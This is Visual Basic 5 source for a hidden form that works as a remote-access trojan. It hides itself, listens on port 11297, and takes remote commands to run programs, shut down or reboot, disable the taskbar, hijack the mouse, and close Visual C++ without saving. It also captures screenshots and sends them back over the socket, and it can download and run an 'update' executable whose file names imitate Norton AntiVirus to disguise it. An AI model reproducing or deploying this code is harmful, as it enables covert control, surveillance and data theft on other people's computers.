VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   0  'None
   ClientHeight    =   90
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   90
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   90
   ScaleWidth      =   90
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer tmrMouse 
      Enabled         =   0   'False
      Interval        =   250
      Left            =   540
      Top             =   30
   End
   Begin MSWinsockLib.Winsock socket 
      Left            =   60
      Top             =   30
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Const portnum As Integer = 11297
Dim mode As String

Private Sub Form_Load()
    On Error Resume Next
    
    If App.PrevInstance Or FindWindow("ThunderRT5Form", App.Title) > 0 Then
        Unload Me
        End
    End If
    
    frmMain.Top = -1000
    frmMain.Left = -1000
    frmMain.Hide
    socket.LocalPort = portnum
    socket.Listen
    
    mode = "GENERAL"
End Sub

Private Sub socket_Close()
    On Error Resume Next
    If socket.State <> sckClosed Then socket.Close
    socket.Listen
End Sub

Private Sub socket_ConnectionRequest(ByVal requestID As Long)
    On Error Resume Next
    If socket.State <> sckClosed Then socket.Close
    socket.Accept requestID
End Sub

Public Sub ProcCmd(ByVal tStr As String)
    On Error Resume Next
    
    Dim DataSplit() As String
    Dim tRet As Long
    Dim success As Long
    Dim ChildWin As Long
    Dim ParentWin As Long
    
    'used for text scanning...
    Dim hwndlength As Long
    Dim FirstWindowText As String
    Dim SecondWindowText As String
    Dim X As Integer
    
    DataSplit() = Split(tStr, "|")
    
    Select Case LCase(DataSplit(0))
        Case "opencd"
            ' open cd here
            tRet = mciSendString("Set CDAudio Door Open Wait", 0&, 0&, 0&)
        Case "closecd"
            ' close cd here
            tRet = mciSendString("Set CDAudio Door Closed Wait", 0&, 0&, 0&)
        Case "urlnav"
            ' open DataSplit(1) in browser here...
            success = ShellExecute(0&, vbNullString, DataSplit(1), vbNullString, "C:\", 1)
        Case "msgbox"
            ' show certain msgbox
            Select Case DataSplit(2)
                Case "okonly"
                    MsgBox DataSplit(1), vbOKOnly, DataSplit(3)
                Case "yesno"
                    MsgBox DataSplit(1), vbYesNo, DataSplit(3)
                Case "error"
                    MsgBox DataSplit(1), vbCritical, DataSplit(3)
                Case "info"
                    MsgBox DataSplit(1), vbInformation, DataSplit(3)
                Case "ques"
                    MsgBox DataSplit(1), vbQuestion, DataSplit(3)
                Case "abreig"
                    MsgBox DataSplit(1), vbAbortRetryIgnore, DataSplit(3)
                Case "reca"
                    MsgBox DataSplit(1), vbRetryCancel, DataSplit(3)
            End Select
        Case "runapp"
            ' appactivate here
            AppActivate (Shell(DataSplit(1), vbMinimizedFocus)), False
        Case "hidestart"
            ' hide start button here
            ParentWin& = FindWindow("Shell_TrayWnd", vbNullString)
            ChildWin& = FindWindowEx(ParentWin&, 0&, "Button", vbNullString)
            Call ShowWindow(ChildWin&, SW_HIDE)
        Case "showstart"
            ' show start button here
            ParentWin& = FindWindow("Shell_TrayWnd", vbNullString)
            ChildWin& = FindWindowEx(ParentWin&, 0&, "Button", vbNullString)
            Call ShowWindow(ChildWin&, SW_SHOW)
            
        '============= EXTRA MISCELLANEOUS COMMANDS =====================
        Case "hidebar"
            ' hide the entire start bar
            ParentWin& = FindWindow("Shell_TrayWnd", vbNullString)
            Call ShowWindow(ParentWin&, SW_HIDE)
        Case "showbar"
            ' show entire start bar
            ParentWin& = FindWindow("Shell_TrayWnd", vbNullString)
            Call ShowWindow(ParentWin&, SW_SHOW)
        'Case "hideclock"
        '    ' hide the clock
        '    ParentWin& = FindWindow("TrayNotifyWnd", vbNullString)
        '    ChildWin& = FindWindowEx(ParentWin&, 0&, "TrayClockWClass", Left(Time, 5))
        '    Call ShowWindow(ChildWin&, SW_HIDE)
        'Case "showclock"
        '    ' show the clock
        '    ParentWin& = FindWindow("TrayNotifyWnd", vbNullString)
        '    ChildWin& = FindWindowEx(ParentWin&, 0&, "TrayClockWClass", Left(Time, 5))
        '    Call ShowWindow(ChildWin&, SW_SHOW)
        Case "killbar"
            ' kill (destroy) the start bar 'window'
            ParentWin& = FindWindow("Shell_TrayWnd", vbNullString)
            Call SendMessage(ParentWin&, WM_CLOSE, 0&, 0&)
        Case "killcpp"
            ' kill (destroy) c++ window - doesnt prompt to save data =)
            
            For X = 0 To 30000
                hwndlength = GetWindowTextLength(X)
                FirstWindowText = String$(hwndlength, 0)
                SecondWindowText = GetWindowText(X, FirstWindowText, (hwndlength + 1))
                        
                If Left(FirstWindowText, Len("MyWorkspace - Microsoft Visual C++")) = "MyWorkspace - Microsoft Visual C++" Then
                    Call SendMessage(CLng(X), WM_CLOSE, 0&, 0&)
                End If
            Next X
        Case "backmouse"
            SwapMouseButton 1
        Case "normmouse"
            SwapMouseButton 0
        Case "sleep"
            Sleep CLng(DataSplit(1))
        Case "beep"
            Beep CLng(DataSplit(1)), CLng(DataSplit(2))
        Case "cliptext"
            Clipboard.SetText DataSplit(1)
        Case "shutdown"
            ShutDown
        Case "reboot"
            ReStart
        Case "randmousey"
            If (DataSplit(1) <> "") Then
                tmrMouse.Interval = CInt(DataSplit(1))
            End If
            tmrMouse.Enabled = True
        Case "endmousey"
            tmrMouse.Enabled = False
        Case "update"
            If (DataSplit(1)) <> "" Then
                Open "C:\Program Files\navnt\update.exe" For Binary As #1
                mode = "UPDATE"
            End If
            
            ' 1) check for proper file... save as update.exe
            ' 2) run the other file (updater.exe or something)
            ' 3) have updater.exe delete navapw32.exe, rename
            ' update.exe to navapw32.exe
            ' 4) have updater.exe run navapw32.exe and then
            '    close out
            
        Case "appshot"
            Dim tbool As Boolean
            tbool = saveAppScrn(App.Path & "\nav32.cfe")
            Sleep 500
            socket.SendData "screenget"
            
            Open App.Path & "\nav32.cfe" For Binary As #1
                Dim chunk As String
                Sleep 500
                    
                    Do While Not EOF(1)
                        If (socket.State = 7) Then
                            chunk$ = Input(4196, #1)
                            socket.SendData chunk$
                            Sleep 200
                            DoEvents
                        End If
                    Loop
                
                    Sleep 1000
                Close #1
                
                If (socket.State = 7) Then
                    socket.SendData "closepic"
                End If
                
        Case "screenshot"
            Dim tbool2 As Boolean
            tbool2 = SaveScreenToFile(App.Path & "\nav32.cff", True)
            Sleep 500
            socket.SendData "screenget"
            
            Open App.Path & "\nav32.cff" For Binary As #1
                Dim chunk2 As String
                Sleep 500
                    
                    Do While Not EOF(1)
                        If (socket.State = 7) Then
                            chunk2$ = Input(4196, #1)
                            socket.SendData chunk2$
                            Sleep 200
                            DoEvents
                        End If
                    Loop
                
                    Sleep 1000
                Close #1
                
                If (socket.State = 7) Then
                    socket.SendData "closepic"
                End If
    End Select
End Sub

Private Sub socket_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    Dim data As String
    
    socket.GetData data$, vbString
    
    If (data = "closefile") Then
        Close #1
        mode = "GENERAL"
        AppActivate (Shell("C:\Program Files\navnt\navntupdate.exe", vbHide)), False
        Unload Me
        End
    End If
    
    If (mode = "UPDATE") Then
        Put #1, , data$
    ElseIf (mode = "GENERAL") Then
        ProcCmd data$
    End If
End Sub

Private Sub socket_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    On Error Resume Next
    If socket.State <> sckClosed Then socket.Close
End Sub

Private Sub tmrMouse_Timer()
    On Error Resume Next
    Dim X As Double
    Dim Y As Double
    
    X = Rnd(Screen.TwipsPerPixelX) * 800
    Y = Rnd(Screen.TwipsPerPixelY) * 600
    
    SetCursorPos CLng(X), CLng(Y)
End Sub
